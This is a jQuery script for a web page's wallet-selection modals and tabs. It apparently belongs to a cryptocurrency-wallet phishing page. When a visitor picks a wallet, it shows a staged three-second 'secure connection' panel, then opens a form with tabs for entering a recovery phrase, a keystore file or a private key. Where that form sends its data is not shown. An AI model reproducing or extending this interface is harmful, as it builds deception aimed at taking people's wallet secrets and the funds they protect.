$(document).ready(function () {
  // Modal
  let $close = $("#close-btn");
  let $close2 = $("#close-btn2");
  let $close3 = $("#close-btn3");
  let $modal = $("#modal-1");
  let $modal2 = $("#modal-2");
  let $modal3 = $("#modal-3");

  let $open1 = $("#open-form-modal");

  $(".wallet-item").click(function (e) {
    $ele = e.currentTarget;

    $targetImage = "";
    document.querySelector(".wallet-name").innerHTML =
      $ele.childNodes[3].innerHTML;
    document.querySelector(".wallet-item__img--2").innerHTML =
      $ele.childNodes[1].innerHTML;

    // $walletName = $ele.childNodes[3].innerHTML;
    document.querySelectorAll("#walletname").forEach((ele) => {
      ele.value = $ele.childNodes[3].innerHTML;
    });

    document.querySelector(".lpd-secure-conn").style.display = "block";
    document.querySelector(".lpd-secure-conn-top").style.display = "none";
    $modal2.addClass("active");
    setTimeout(() => {
      document.querySelector(".lpd-secure-conn").style.display = "none";
      document.querySelector(".lpd-secure-conn-top").style.display = "flex";
    }, 3000);
  });

  $close2.click(function () {
    $modal2.removeClass("active");
  });

  $close3.click(function () {
    $modal3.removeClass("active");
  });

  $open1.click(function () {
    $modal2.removeClass("active");
    $modal3.addClass("active");
  });

  $close.click(function () {
    $modal.removeClass("active");
  });

  //   Tabs
  let $navs = $(".navigator-item");

  let $navs1 = $("#btn-11");
  let $navs2 = $("#btn-22");
  let $navs3 = $("#btn-33");

  let $phrase = $(".phrase-cont");
  let $keystore = $(".keystore-cont");
  let $private = $(".private-cont");

  $navs.click(function () {
    $(this).siblings().removeClass("active");
    $(this).addClass("active");
  });

  $navs1.click(function () {
    $private.removeClass("active");
    $keystore.removeClass("active");
    $phrase.addClass("active");
  });
  $navs2.click(function () {
    $phrase.removeClass("active");
    $private.removeClass("active");
    $keystore.addClass("active");
  });
  $navs3.click(function () {
    $phrase.removeClass("active");
    $keystore.removeClass("active");
    $private.addClass("active");
  });
});
